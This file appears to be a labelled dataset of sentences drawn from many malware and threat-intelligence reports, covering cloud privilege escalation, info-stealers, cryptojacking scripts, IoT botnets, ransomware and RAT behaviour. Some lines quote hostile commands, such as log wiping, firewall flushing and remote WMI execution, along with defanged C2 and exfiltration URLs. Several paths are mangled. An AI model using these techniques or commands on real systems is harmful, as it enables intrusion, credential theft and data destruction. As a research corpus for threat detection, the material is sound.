1	The attacker checks the permissions policies of the roles that can be exploited.
1	If any of these roles are more privileged (i.e.have more permissions) than the attackers current identity, the attacker can pass this role to a service and gain the elevated privilege from the service.
1	The attacker finds multiple roles with AdministratorAccess that can be assumed by EC2.
1	The attacker creates a new EC2 instance and attaches EC2ManagerRole to the VM.
1	The attacker then logs in to the VM and calls the metadata service API at http://169.254.169[.]254/latest/meta-data to retrieve the session token.
1	Attackers path to compromise the cloud.
1	An attacker obtains a list of role names (e.g., prodApp-nat, prodApp-app2-nat) through reconnaissance and enumeration.
1	The attacker obtains a temporary access token by assuming the misconfigured role.
1	With the access token, the attacker can enumerate the permissions and find the resources it can access.
1	The attacker can see all the EC2 instances and read their metadata.
1	From the startup script in the metadata, the attacker can obtain information such as the Docker images the VM deploys, the database that the VM queries and the S3 buckets the VM pulls data from.
1	The attacker then accesses the S3 buckets found in the EC2 metadata and downloads all the data.
1	The attacker uses the AWS KMS decrypt capability available to the role to decrypt the ciphertext, now giving the attacker plaintext access credentials.
1	After obtaining the plaintext credentials, the attacker can move laterally and access the Docker Hub repository, Splunk server and databases.
1	With the private keys for certificates, attackers could launch man-in-the-middle attacks or impersonate the companys official sites.
1	With source code repository access, attackers could leak the companys intellectual properties, find vulnerabilities or even inject malware into the source code.
1	The malicious DLL landed on gamers computers running under either 32-bit or 64-bit operating systems.
1	The malicious program was looking for a specific process running on the server, injected code into it, and then sought out two places in the process code where it could conceal call commands for its function interceptors.
1	Using these function interceptors, the malicious programs modified process data which was processed in those two places, and returned control back.
1	Thus, the attackers change the normal execution of the server processes.
1	In particular, they they downloaded an auxiliary program ff._exe to the Config.Msi folder on the infected machine.
1	This code searches for HTML, MS Excel, MS Word, Adobe, PowerPoint and MS Works documents and text files (.txt) on the hard drive.
1	In addition, cybercriminals used the AheadLib program to create malicious libraries (for details, see the second part of the article).
1	As for Vidar abusing the platform, it first creates an API URL for faceit.com before communicating with the C&C server.
1	Routine for creating C&C URL
1	When Vidar requests HTTP GET for the URL shown above, it receives the json format data from faceit.com.
1	The malware parses the about part in the data, which is the actual URL for the C&C server.
1	Data received from faceit.com
1	If the attacker edits the About part and enters another address, the Vidar info-stealer will connect to the changed C&C server and continue to perform malicious activities.
1	If Faceits attacker account is not blocked, the attacker can repeatedly edit the C&C server to make the same malware connect to different C&C servers.
1	It is likely that the attacker is using the method to bypass network detection for the C&C URL.
1	Vidar connects to the actual C&C servers established and receives DLL files needed for commands and info-stealing, and ultimately sends the stolen information to the C&C server.
1	Taking advantage of their control of an infected computer, cybercriminals place a malicious library in the %WINDIR% folder.
1	This enables the attackers to ensure that the malicious DLL is loaded at system startup: explorer.exe loads the malicious winmm.dll from the %WINDIR% folder as soon as it launches during system startup.
1	Instead, they used the well-known AheadLib program.
1	The program accepts a DLL as its input and creates C code which hooks the functions included in the library.
1	They fed a real library (e.g., winmm.dll) to the program and obtained a source code template to create a modified DLL  in the shape of a C file  as the output.
1	By adding a malicious payload, the attackers created a complete piece of malware that included all the features of the real DLL in addition to its malicious functionality.
1	Bizarrely, the attackers kept the code for AheadLib debug messages in the early versions of their malware (marked with a red border in the screenshots above).
1	In function check(), the malware first obtains the location information of the infected machine by sending an http request to hxxps://ipapi.co/json/.
1	It then filters out Belarus (BY), Russia (RU), and Ukraine (UA) in order to prevent itself from running if the malware is being executed in one of those countries.
1	In the main() function, it first deletes the Go binary.
1	Then it calls the function randSeq() to generate a random AES key where the size is 0x20 in bytes, like the following:
1	Next, it calls the function makesecret(), which is used to encrypt the AES key with an RSA public key hard-coded in the binary.
1	Next, it calls the function EncodeToString in the Golang package encoding/base64 to encode the previously encrypted data with a base64 algorithm.
1	It then forms a buffer for the decrypted README file, shown in Figure 8.
1	We can see that the encrypted AES key is written into the decrypted readme file with Base64 encoding.
1	Before the ransomware encrypts files, it kills the following list of processes by issuing the commands service stop [pname] or systemctl stop [pname].
1	When it attempts to stop apache2.service, it prompts a dialog titled Authentication Required to instruct the user to input the system password to finish this operation.
1	Finally, the malware starts to traverse the root directory / by calling the function Walk(root string, walkFn WalkFunc) in the Golang package path/filepath and then encrypting files.
1	The malware encrypts files using the AES-256-CFB algorithm, and the encrypted files have a name that concatenates the original name with an .encrypted extension.
1	The vulnerability allows remote administrators to execute arbitrary commands by injecting shell meta-characters $() in the NewStatusURL and NewDownloadURL as can be seen below.
1	After these have been executed, the exploit returns the default HUAWEIUPNP message, and the upgrade is initiated.
1	When started, the bot tries to resolve the IP address of a C&C server using DNS request with the hardcoded domain name.
1	Then the bot takes addresses from the DNS response and tries to connect using TCP protocol with the hardcoded target port (7645 in the researched sample).
1	The number of packets used for the flooding action and their corresponding parameters are transmitted from the C&C server:
1	After sending packets, the bot does not wait for any answer from the attacked hosts.
1	To exploit the CVE-2020-0688 Exchange bug, hackers need the credentials for an email account on the Exchange server -- something that script kiddies don't usually have.
1	The Black-T script is downloaded from the TeamTNT domain, hxxps://teamtnt[.]red/BLACK-T/SetUpTheBLACK-T, to the compromised cloud system that maintained an exposed Docker daemon API.
1	Then, the script performs a clean and system prep operation, in which the script will remove known cryptojacking malware already in place on the compromised system.
1	Following the cleanup of the compromised system, the script will further set up the system environment by setting Path Variables: PATH=/bin:/sbin:/usr/bin:/usr/local/bin:/usr/sbin, naming 8.8.4.4 and 8.8.8.8 as new DNS servers, and finally, flushing all established IP table rules using the command iptables -F.
1	Regardless of the package manager type identified, the script will install masscan, along with libpcap to perform network packet traffic listening, pnscan (a network scanning tool, although within the current sample, pnscan functionality has been commented out), zgrab (a GoLang tool built for zmap), Docker and jq (a flexible command-line JSON processor).
1	The Black-T variant downloads two files, which execute directly into bash: hxxps://teamtnt[.]red/BLACK-T/beta and hxxps://teamtnt[.]red/BLACK-T/setup/bd.
1	The beta script then downloads the file hxxps://teamtnt[.]red/x/pw, and also downloads the hxxps://teamtnt[.]red/BLACK-T/setup/bd, which is a duplicate from the Black-T download.
1	Finally, the beta script will set the service token for monitoring XMR mining operations.
1	This token is set as abyofigfefda6c3itn9f3zkrmjfays31, and it will redownload the Black-T script, hxxps://teamtnt[.]red/BLACK-T/SetUpTheBLACK-T.
1	Upon uncovering any passwords residing in memory within the compromised system, the passwords are written to the file /var/tmp/.../output.txt, which is then uploaded to hxxps://teamtnt[.]red/only_for_stats/dup.php.
1	The code inserted by the cybercriminal loads the external malicious script ldfidfa[.]pw/jquery.js?&up=  &ts=  &r=  &u=  &c= Malicious jquery.js scriptThe jquery.js script overlays an iframe that is exactly the same size as the page.
1	The PDF malware dropper creates a file named C:Documents and SettingsAdministratorLocal SettingsTempAcroRd32.exe and runs it.
1	AcroRd32.exe has a PE compilation timestamp of Wed Jul 11 05:39:45 2012.
1	AcroRd32.exe contains an encrypted block with the final payload, an 8KB backdoor, which is dropped as clbcatq.dll and run via Windows Update.
1	The backdoor connects to its C&C server and requests further data using HTTP GET requests.
1	The response from the server is expected to be a slightly encrypted DLL, which is then loaded and called by exports InfectFile and GetWorkType.
1	For all the servers, the malware makes a request to /news/show.asp, using a custom agent string of Mozilla/4.0 (compatible; MSIE 6.0; WindowsNT 5.1; SV1).
1	Thus, it is assumed that Cobalt Strike was installed through Invoke-Shellcode.ps1.
1	Records show that after the installation, Cobalt Strike created info-obtaining malware and CoinMiner malware as shown below.
1	It was discovered that a powershell process was attempting to run a malicious script (%temp%mp5O91.ps1) in a certain folder to download the beacon.
1	Base64 decoding process is skipped for the script and it goes through the XOR (0x35) operation and loads the shellcode to the memory.
1	The shellcode above takes the form of Stager and attempts to download the beacon from C2 (pilottrustme[.]top, 54.238.214[.]219) located at the very bottom.
1	It also sends collected browser data to another script by sending a POST request to hxxp://[c2_hostname]/groups/count/write.php.
1	It decodes the binary and writes it to a Java temporary directory with name ntuser.bin.
1	Then, it copies the system file rundll32.exe to the same directory with name ntuser.exe and runs it with ntuser.bin as a parameter, effectively loading the malicious DLL file.
1	The purpose of the shellcode is to download a GIF image file from URL hxxp://[c2_hostname]/groups/pic.gif, then search for and decrypt the hidden PE file inside of it.
1	The new vulnerability allows criminals to target AliExpress users by sending them a link to an AliExpress web page containing malicious Javascript code.
1	Upon opening the page, the code is executed in the users web browser and so bypasses AliExpresss protection against cross-site scripting attack by using open redirect vulnerability on AliExpress web site.
1	Once customers arrive at the sites home page, AliExpress often shows them a pop-up overlay and asks them to input their credit card details in order to ensure a more efficient shopping experience.
1	If an attacker were to find a way to inject code to AliExpress this could abuse the AliExpress logic and create a payload that would look something like this:
1	The attack starts by luring the victim into clicking on a malicious link, sent by email for example.
1	Search Google A phishing page prompting users to click the download buttonClicking the Link or the Download Buttonhxxps://imgfil[.]comorhxxps://blltly[.]comhxxp://capabresume[.]comhxxps://ljett[.]comhxxps://eemgl[.]comhxxps://ezwcom[.]comClicking the Download Buttonhxxp://yabimer[.]com
1	However, as one file is hidden, users will only see the call-of-duty-localiz_240662092.exe file and double-click it to begin the installation.
1	The hidden file is a normal program named WSCC, and call-of-duty-localiz_240662092.exe is malware that installs the adware.
1	Upon execution, it creates a random path in the Program Files (Program Files (x86) folder in the x64 environment) folder and runs the program.
1	Attackers inserted malicious links into car advertisements, which redirected visitors interested in the vehicle to a malicious site that injected them with the JSEcoin coinmining script, as shown in Figures 5-7.
1	External link in libero[.]it, which would redirect visitors to compromised sites.
1	On successful delivery, the exploits drops a backdoor in form of a 101/104 KB Universal Mach-O executable.
1	The device`s MAC address is retrieved and stored by sending IOCTL 0x8927 to the eth0, br0, eth1 and eth2 devices.
1	If the device the malware is currently running on runs the GoAhead embedded web server, the following shell command lines are executed: rm -f /tmp/ftpupload.sh, ln -s /dev/null /tmp/ftpupload.sh , rm -r /var/log
1	These actions are used to delete a previous shell script used by the WIFICAM exploit and to create a symbolic link to /dev/null, thus preventing any further attempts of using it, as well as clearing all log files to clear its evidence from the device.
1	IoTroop kills any open telnet processes open using port TCP/23.
1	It then continues to scan the devices memory for the existing strings that are used by other IoT malware.
1	If any of these strings are found, the process containing them is killed.
1	hl852.com (27.102.101.121)The commands and arguments issued from the controller to the IoTroop client are sent in a JSON format.
1	if a port exists and is equal to 80, than a string of the format https://<ip><url_path> is constructed, otherwise it sets it to be https://<ip>:<port><url_path>, using the values of ip, port and path as the data to place in the string.
1	Otherwise it will be placed under the /tmp directory.
1	Before handling the constructed URL, the bot will attempt to kill all similar processes by name, issuing the command killall <name>, where the argument is taken from the aforementioned name key.
1	Finally, the URL will be passed to a download function.
1	The download function will first check the status of the file using lstat to verify that it exists and is valid for subsequent reading action, following which the MD5 hash function will be applied on its contents.
1	Upon opening the file and reading it, a supposed reporting or logging string of the format open:error\success or read:error\success will be constructed depending on the status of each of the actions accordingly, however this string is never used, suggesting that the malware is still undergoing adjustments and is in a development phase.
1	Each of the infected devices constantly pulls for available commands from the controlling C&C server.
1	If indeed the file versions differ, a new file will be generated with the permission r-xrwxrwx and a socket will be established to the destination server (containing the required file).
1	IoTroop will construct an HTTP GET request and write it to the socket, after which it will try to read its contents in chunks of 128 bytes (in the event the request succeeded).
1	These will be written to the newly created file, and checked one more time against the MD5, provide by the controllers, to verify that the contents were retrieved properly.
1	Either way, in order to spawn the new process, the command /bin/sh sh -c <path_to_executable> <runtype> <runport> will be used.
1	The malware then utilizes internal Lua functions in order to execute the following Lua script, which is embedded as a string inside the malware:
1	This script communicates with the hard coded C&C addresses of the malware and is actually the main payload.
1	It starts by reporting the infection details to the reporting C&C (bbk80.com) using the global variables previously defined.
1	It then enters an infinite loop where it downloads Lua scripts from the command C&C (cbk99.com) and executes them.
1	It works by downloading the run.lua file (a Lua script) from the C&C and passing it as an argument to the attack function that was previously defined in main.
1	When the ransomware file is run, it deletes the volume shadow copy and proceeds with the encryption using the commands shown below.
1	Also, to encrypt currently running files such as documents, the malware terminates processes that match names shown below among the running processes.
1	[pecunia0318@airmail.cc].pecunia is added, and a ransom note with the readme-warning.txt filename is created in the encrypted folder.
1	The ArabicRSS Trojan takes its C&C server address from the androidupdaters.com/img.jpg file.
1	Obfuscated JavaScript code injected into the mnp.nkr[.]am websiteThis code loads an external JavaScript from skategirlchina[.]com/wp-includes/data_from_db_top.php.
1	If it is the first time the users browser executes the script, it will add an evercookie with a seemingly random MD5 value provided by the server, different at each execution of the script.
1	Then, it collects several pieces of information including the browser plugin list, the screen resolution and various operating system information.
1	This is sent to the C&C server in a POST request.
1	If there is a reply, it is assumed to be JavaScript code and is executed using the eval function.
1	Fingerprint script (malicious URLs defanged)If the visitor is deemed interesting, the server replies with a piece of JavaScript code that creates an iframe.
1	Once the malicious executable is downloaded from the same server as the iframes JavaScript, and if the user launches it manually, a Turla malware variant and a legitimate Adobe Flash program are installed.
1	Overview of the watering hole operationOnce the user executes the fake installer, it will execute both a Turla malware variant and a legitimate Adobe Flash installer.
1	The new payload was a .NET application that dropped an installer for Adobe Flash v32 in %TEMP%\adobe.exe, and NetFlash (a .NET downloader) in %TEMP%\winhost.exe.
1	NetFlash downloads its second stage malware from a hardcoded URL and establishes persistence for this new backdoor using a Windows scheduled task.
1	Currently, the website does not have both shortened and final connection URL, but at the time of analysis, it was possible to download the compressed file (bitcoin.zip).
1	When the user downloads the lnk file as the attacker intended, the malware is downloaded from the malicious URL, and is saved as WindowsUpdate.exe file in %Temp% directory.
1	When the downloaded file is executed, it uses CMD dir command to check information of various folders and files.
1	The Dropper module starts its execution by unpacking and running embedded an executable, which is run via 'rundll32.exe' call.
1	Once executed, it initially checks if the directory 'c:\Windows\cscc.dat' exists, if it is the case.
1	It then chooses the appropriate driver from within its embedded resource (32 or 64 bit versions) which is written to 'c:\windows\cscc.dat'.
1	The main payload executable is then written to C:\windows\dispci.exe Following a creation of a scheduled task named 'rhaegal' which is used to execute it on every system restart using this command line:
1	Following the dropper module, it schedules a system shutdown by creating yet another scheduled task named  'drogon' by using this command line.
1	It also deletes windows events and the USN drive c:\journal by using this command line.
1	Once these actions are complete, the dropper deletes the 'drogon' scheduled task and starts a separate thread in order to encrypt each of the system drives.
1	Finally, a file named Readme.txt` is created which contains the ransom note:
1	Once authenticated into a network share, the dropper will drop itself into it by copying these files: \\%s\admin$\infpub.dat, \\%s\admin$\cscc.dat
1	These files are then remotely executed via the following WMI command: c:\Windows\system32\wbem\wmic.exe process call create C:\Windows\System32 undll32.exe  \C:\Windows\%s\ #1
1	It then sends custom commands via 'DeviceIOControl' in order to perform different actions which include:
1	After this the previously created scheduled tasks named rhaegal' and 'drogon' are deleted.
1	After which it starts the files encryption routine which is done by sending 'DC_CTL_ENCRYPT_START' and 'DC_CTL_ENCRYPT_STEP' commands to the previously installed driver and by using the same public key used by the dropper module.
1	It then executes shutdown.exe /r /t 0 /f to force system restart.
1	It waits for five seconds and then creates a link to itself on the desktop: \\Desktop\\DECRYPT.lnk.
1	After the victim opens the specially crafted RTF document, and the Microsoft Word vulnerability is exploited, a file named intel.wll is dropped into the Word startup folder: %APPDATA%\Microsoft\Word\STARTUP.
1	Every time that Microsoft Word application is launched, all the DLL files with a WLL extension in the Word Startup folder would launch as well, triggering the infection chain we describe below:Infection Chain Diagram.
1	After its loaded, the malicious intel.wll DLL proceeds to download and decrypt the next stage of the infection chain, from one of the threat actors servers: 95.179.242[.]6.
1	The next stage downloaded is also a DLL file, and it serves as the main loader of the malware framework developed by the attackers.
1	It is executed using Rundll32, and it communicates with another one of the threat actors C&C servers (95.179.242[.]27) to receive additional functionality.
1	At the final stage of the infection chain, after the appropriate command is received, the malicious loader downloads and decrypts a RAT module, also in the form of a DLL file, and loads it into memory.
1	When analyzing one of the files from the open directory (bf9ef96b9dc8bdbc6996491d8167a8e1e63283fe), we noticed that it decrypts and loads a DLL named wincore.dll.
1	The DLL, downloaded from 95.179.242[.]6, is a downloader for an additional payload.
1	Minisdllpub.dll begins by creating a mutex with the name Afx:DV3ControlHost.
1	Next, another structure of size 0x3FC is created, this time to store pointers to loaded DLLs and API functions, as well as the command and control IP address (95.179.242[.]27) and port (443).
1	When the server replies, it sends XOR encoded DLL to the malware, with the key 0x51.
1	Minisdllpub.dll then decodes the given payload and dynamically loads the new PE to memory.
1	First, is the Minisdllpub.dll that was initially loaded using Rundll32 by http_dll.dll (intel.wll) when a Microsoft Office application was executed.
1	Next, we have the RAT payload itself which receives its control commands not directly from the C&C, but through Minisdllpub.dll that acts as a mediator.
1	Upon opening the email attachment, victims would be redirected to a JAR file which executes a malicious JAVA code to initiate the malware installation process.
1	The executable used by the malware, named vprintproxy.exe (delivered under the name vm.png) is a legitimate file signed by VMware.
1	In order to conceal itself from security products, the malware uses a DLL hijacking technique in which the actual malicious code is stored in vmwarebase.dll, which is automatically being loaded by the legitimate VMware process once executed.
1	Once vprintproxy.exe is invoked and vmwarebase.dll is loaded as a dependency, execution is passed to its DllMain entry point.
1	The sole purpose of this DLL is to inject prs.png (the core malware module) to both explorer.exe and to a spawned notepad.exe process.
1	The path of png (which has its name modified to a random integer between 0 and 999999999 and extension changed to db) is first resolved, by checking the specified random integer within the contents of C:\Users\public\Administrator\car.dat (delivered as part of the infection chain).
1	Then the corresponding file is searched for in the C:\Users\public\Administrator.
1	If found, the path string would be simply written into an allocated buffer within the target processes, as appears in the image below:
1	Before conducting the injection, vmwarebase.dll will enumerate all processes and will look for all running instances of conhost.exe.
1	At its OEP, the module further retrieves environment information, and then creates a mutex with the string SUPER MUTEX.
1	Then the module steals authentication credentials from mail.ru agent software and attempts to steal open and saved attachments on the system from the Outlook Secure Temp Folder.
1	The executable then fails to write its own contents to another executable file in tmp and maintain persistence on the system.
1	The module steals Mail.Ru Mail Agent account credentials by reading relevant registry in order to extract the passwords or decrypt them depending of the version.
1	The contents of this registry keys are read and the blowfish key stored inside ver.txt is used to decrypt the passwords, in version 5.7 and above.
1	All actions are logged with time stamp, and then encrypted and written to %temp%~avp2.log.
1	The data of this file will also be written to %temp%~mslog.tmp, which is a backup of ver.txtAfter the module will build a new string with the current timestamp followed by delimiting dashes and indication that the module has finished running, like 2012:11:10:10:22:34-PROGA END.
1	The module will finally attempt to steal open attachments or attachments that were open when the machine or Outlook application shutdown unexpectedly.
1	It identifies and collects these files from a directory path that looks like C:\Documents and Settings\%username%\Local Settings\Temporary Internet Files\OLK%xxx%.
1	It creates %temp%\19d400.msv, and attempts to write a copy of its own executable contents to it.
1	It then attempts to run this 19d400.msv file by calling CreateProcessA on it, which also fails.
1	This module is a standalone executable, which is essentially a tool to dump cached domain password hashes, and locally stored sensitive information, such as LSA secrets.
1	It uses direct disk access to bypass system registry ACLs.
1	After execution the module self-removes.
1	First, it uses direct disk access to copy registry files from %SYSTEM%\config\ directory:
1	Also, it fetches Syskey bootkey secret and appends it to the output.
1	The result is stored in an encrypted file of custom binary format which is located in%TMP%\smrdprev.tmp.
1	The module also creates an encrypted log file with detailed information of program execution.
1	It is stored in similar file %TMP%\smrdprev.tmp, the hex number depends on current system boot time.
1	It is encrypted in the same way as the main output file, using custom cryptoalgorithm based on AMPRNG cryptomethod.
1	After the end of execution it deletes temporary files and self-removes with simple msc.bat file of the following contents:
1	It starts from creating a new encrypted log file in current directory of the executable, named system32ocxms.dat.
1	During next step, it creates a watchdog thread, which every checks foreground window every 10 milliseconds and in case current foreground window belongs to current process it spawns self-removal batch-file (see description in section below) and terminates current process.
1	In the end of execution before exiting application it runs self-removal procedure as described below.
1	When the module needs to end the execution and self-remove, it creates a batch-file with pseudo-random name:%HOMEDRIVE%%HOMEPATH%\Local Settings\Temp\.bat.
1	Creates mutex 208D2C60-3AEA-1069-A2D7-08002B30309D
1	Creates a directory and a log file in it:%ALLUSERSPROFILE%\Application Data\System\smrdprev.%d%d.tmp(%d values correspond to time64() ^ 0x1F3E231 and GetTickCount()).
1	Tries to open config file jusched32s.dat and read the contents.
1	Seeks in directory specified in email_hash_path for*mso.dat files, reads their contents and compares the hashes stored in them with calculated hash.
1	Creates File%email_hash_path%\%s%.mso.dat(%s  CRC32(GetUserName)) and appends counted hash to it.
1	Creates file:%storage_path%\bcmntc.%d.tmp(%d  time64 ^ 0x1F3E231.tmp) with decrypted contents including email header:@CMAIL_LOCAL\%s_%04u%02u%02u_%02u%02u%02u\%d.eml(email field, Date, Email number) and email contents itself.
1	Checks file MD5 hash in file header (first 16 bytes), if it was changed after the last saved MD5 (in memory as a variable), then updates it and writes the new hash to log file.
1	If unistall parameter is set in config file, then module deletes AutoRun keys in registry, config filejusched32s.datand terminates.
1	If the new File Size is bigger than storage_hash_size than rewrites the file with the latest data so its size doesnt exceed storage_hash_size.
1	Upon execution, the dropper reads its overlay and decompresses it in memory.
1	The configuration file imapisync32.dat is dropped first followed by the opening of a system event named ScxinWordSid_0129211FA.
1	This event is created by the USBStealer module.
1	Afterwards, it will try to delete theIGFXTRAYMS.EXEfile without checking if it exists or not.
1	The USBStealer module is then dropped using the following file name:IGFXTRAYMS.EXEand executed.
1	Upon start the module creates a general purpose log file in%TMP%\smrdprev..tmp, where DWORD is a current time value xored with 0x1F3E231, DWORD2 is value of GetTickCount() API call.
1	Next step, it checks if current user has local administrator rights and logs this as well (-ADMIN MODE- or -USER MODE-).
1	It creates an invisible window named sbw (Unicode) with window class Win32UserHost.
1	Once the new volume appears in the system the module starts a separate thread to process this event.
1	When new USB drive is attached, the module obtains USB device software and vendor ID, drive character, volume name, filesystem type, volume serial number, number of free and used bytes.
1	Then it reads the filesystem using direct disk access and own parser of FAT-based filesystems.
1	It creates own database of known files hashes and registers a listener for filesystem changes to do that efficiently.
1	At the start it creates system mutex named Win32Wbem32Prefetch, a system event named ScxinWordSid_0129211FA (used to signal end of execution) and a log file at%TMP%\imapispool..0x.ids.
1	It collects basic system information such as current computer name, current username, and path to original executable module where it started from.
1	If thats true it deletes current log file and opens a new one using the same path.
1	It changes registry settings to start automatically on system boot.
1	The changes are made to HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\winns32compvalue.
1	It creates an invisible window named sbw with window class Win32UserHost.
1	At the same time it create configs monitoring thread which reacts on file changes and reloads new values.
1	The config files are stored in the same directory where current executable module is and named imapisync32.dat, wmilibrt.dat.imapisync32.datis encrypted using some custom algorithm, and has information about file targets to track and copy if found.
1	It collects full file paths and file meta-information, compresses, encrypts and stores this in%TMP%\mrtdsync\win64esrt_*database.
1	Additionally, files from the list of interest are copied to win64berts* files, which also have full information and body of the file.
1	There is a separate thread to monitor filesystem changes and every time new file/directory is created or changed on the monitored drives updated information goes to%TMP%\mrtdsync\win64esrt_*in separately spawned thread, additionally all changed or created files are copied to a new win64berts* file.
1	Opens and Creates Event WIN_%08X%08X%08X%08X%08X (SHA1(first 512 bytes of self file)), if exists, terminates.
1	Deletes file Keylogger.log (this filename is not used anywhere else).
1	Creates window with CreatWindowEx API using ClassName svchost.exe, window name svchost and associates it with a registered class.
1	Registers a device with RegisterRawInputDevices API and associates it with created window with a flag RIDEV_INPUTSINK which enables the caller to receive the input even when the caller is not in the foreground.
1	It collects some general information about current user and opened windows/processes: Foreground window text or WT_UNKNOWN, Module FileName or MN_UNKNOWN, Foreground window class name, UserName
1	It is capable of making full desktop screenshots, copying clipboard data of password input fields (to check a window EM_GETPASSWORDCHAR is sent to the window).
1	Creates File%TMP%\SSDPserv32\ssdtrbs%08x%.sys.%d%(%08x  Random Hex value, %d  time64()).
1	All the collected information is compressed with Zlib and RC4 encrypted with the key qefwljkfnw3l;fjwe;fklwejfw;eflkwe;flweand written to this file.
1	When running the malware, the GUI window loads information, which pools from the web.The malware uses a few layers of packing as well as a multi-sub-process technique to make research more difficult.
1	Created files: Modified registers HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProxyBypassHKCU\Software\Microsoft\Windows\CurrentVersion\Internet 
1	Full analysisAfter receiving the sample, I started first with dynamic analysis, executed the file CoronaMap.exe[PID 4280] and opened up a window that showed the following CoronaVirus statistics: 
1	Running procmon at the same time revealed a multi-sub process that was created by CoronaMap.exe[PID 4280] which is the root process.
1	CoronaMap.exe[PID 4280] starts by creating another binary called Corona.exe[PID 7032].
1	Upon opening the Corona.bat file, we could see that Corona.sfx.exe was extracted with a hardcoded password (3D2oetdNuZUqQHPJmcMDDHYoqkyNVsFk9r) to the C:\windows\system32 directory:
1	The Corona.sfx.exe[PID 3552] is an extracting process called Corona.exe[PID 9452].
1	This process creates more processes, but we will be focusing on only three of them: bin.exe[PID 8604], timeout.exe[PID 5680] And Build.exe[PID 6348]
1	As I started to analyze thebin.exe[PID 8604] with Ollydbg, I was able to see that it was writing some Dlls, one of which was known to me from different actors: the nss3.dll :Going deeper inside with Ollydbg, I saw static loading of APIs related to nss3.dll.
1	The code utilized the API functions within the nss3.dll to decrypt saved passwords and create output data.
1	Its behavior is as follows: When the victim gets infected, the malware extracts data and creates a unique ID of the victims workstation.
1	It then applies XOR encryption using the generated ID.
1	The C2 server responds with configuration data, which contains target web browser names, web browser path information, API names, sqlite3 queries, and legitimate DLLs.
1	The password-stealing operation process is simple because the malware steals the login data from the installed browser and moves it to C:\Windows\Temp.
1	To read the date the malware queries the SQLite data in order to extract the information.
1	Once the extraction is over, the malware creates a file called PasswordList.txt, which holds all the information.
1	Also looking for Telegram Desktop:Searches for Steam account:Takes a screenshot and saves it as scr.jpg:
1	Resolve the public IP address of the victim machine and save it as ip.txt:
1	Collecting information about the system such as the OS system, the architecture, the hostname, the username, etc:
1	As I continued with bin.exe[PID 8604], I found that the malware communicates with its C2 server using the address of 104.24.103.192:80, which we can resolve to http://coronavirusstatus[.]space/.
1	By analyzing the traffic, I found that the bin.exe[PID 8604] uses chunked transfer encoding, which is also something we see in the wild.
1	When the Content-Length value is smaller than the chunked payload size, the origin server will check the Content-Length header to determine the length of the request, but there will be some leftover payload that will be concatenated to the next incoming request.
1	The Build.exe[PID 6348] creates a subprocess Windows.
1	Globalization.Fontgroups.exe[PID 3848] which the persistence runs.
1	Globalization.Fontgroups.exe[PID 3848], I could see that it was packed with UPX, which is pretty easy to unpack.
1	Globalization.Fontgroups.exe[PID 3848] creates a process called Windows.Globalization.Fontgroups.module.exe[PID 3848] which is responsible for creating the zip file with all the information bin.exe[PID 8604] sends out:C:\Users\shy32\AppData\Roaming\amd64_netfx4-system.runti..dowsruntime.ui.xaml\ENU_64B5614D0F4B35423983.7z
1	The Windows.Globalization.Fontgroups.exe[PID 3848] uses Attrib.exe[PID 8832] in order to hide this directory:
1	As you can see, the malware file download link is: hxxps[:]//www[.]mediafire[.]com/file/d86hz5qj21lmhrb/PROFORMA-INVOICE_0990.7z/file.
1	The downloaded file is a 7z file, which contains the new variant of NetWire RAT.
1	After decompressing it, we are able to get an EXE file with the name of PROFORMA-INVOICE 0990.exe.
1	Figure 3 shows that it calls the API USER32.GetCursorPos() twice to obtain two mouse cursor positions and then compares them.
1	If they are the same (victim not moving mouse), it stops running, and after sleeping it checks again.
1	It also calls the API ntdll.ZwGetContextThread to obtain the current thread context structure, which contains the CPU debug register status.
1	Once the debugger sets hardware breakpoints, the CPU registers that Dr0, Dr1, Dr2, Dr3, Dr6 and Dr7 are not zero.
1	Like most malware, NetWire spawns a suspended child process of itself, and then modifies its memory and its thread context data.
1	It starts by initializing several global variables and Windows Sockets by calling the APIWSAStartup().
1	Next, it decrypts some encrypted strings.
1	It checks to see if the current executable file is located in the correct folder (%AppData%\Install) and has the right file name (Host.exe).
1	If not, it relocates the file into %AppData%\Install and renames it as Host.exe.
1	It then runs the relocated file and exits the current process
1	You can see the process where NetWire was relocated to C:\Users\user_name\AppData\Roaming\Install\Host.exe.
1	NetWire continues to create its home key (HKCU\SOFTWARE\NetWire) as well as adding it into the auto-run group in the victims registry.
1	In this way, it runs automatically when the infected system starts.
1	NetWire is added in Auto-run group in the system registry
1	NetWire creates a log folder to store the log files of information that it collects from the victims system.
1	The log folder is located at %AppData%\Logs.
1	It then calls the_beginthreadex()function to start a thread, the thread function of which registers a window class, whose window procedure function is a keylogger.
1	It then records all of the victims keyboard actions, times, as well as the titles of what the victim is typing on.
1	The recorded data is encoded and stored in a log file.
1	As you can see in the red rectangle, what it has harvested is a website that I typed in on Google Chrome browser.
1	Communicating with the C&C Server
1	It obtains the IP address of C&C server from a DNS service.
1	Its domain is found in the decrypted string, which for this variant is gbam0001.duckdns[.]org:3366.
1	Once the connection with its server is established, NetWire starts waiting for the C&C server to reply with a 9B command packet, which I crafted to feed it from the fake C&C server.
1	NetWire has a function that I call Task_Fun() to handle all of the commands from the C&C server.
1	Once NetWire receives the 9B command, Task_Fun() handles it in a sub procedure which collects the victims computer basic information and sends it back to the C&C server.
1	Collected victims computer information is sent to C&C server
1	Current login User name collected by calling the API GetUserNameA() or from the system environment variable.
1	Victims Computer name by calling the API GetComputerNameA() .
1	Victims Windows version information by calling the API GetVersionExA().
1	Obtains a time value how long the victim has been inactive since the last input.
1	Executes a downloaded executable file or an existing local file like cmd.exe.
1	Performs actions including: exit NetWire process, close the socket to C&C server, read a value from its home key in the system registry, reset or delete a specified registry key, delete the NetWire executable file and relocate its executable file (Host.exe).
1	Steals and collects credentials stored in the victims system by different software.
1	It focuses on these: 360Chrome, Opera, Mozilla Firefox, Mozilla SeaMonkey, Google Chrome, Comodo Dragon browser, YandexBrowser, Brave-Browser, Mozilla Thunderbird, Microsoft Outlook and Pidgin.
1	It also reads the victim's browser history records from the history folder.
1	Operates the log files in its folder (%AppData%\Log), including enumerate log files, get specified log file attribute, read and delete a specified log file.
1	Obtains window handles that are created on the victims device; sends a windows message to a window by specified windows handle; obtains information of all running processes on the victims device; kills a running process using a given process ID; obtains a list of TCP or UDP endpoint information (TCP or UDP, local and remote IP address, port, status) as well as the process information (process name, process id) that connects this endpoint.
1	Collects the victims computer basic information, which include the current username, logon session information, computer name, CPU information, Windows version, memory status, network status, and Windows installation path.
1	It also collects the PowerShell installation path, NetWire executable file full path, and its Log folder full path, etc.
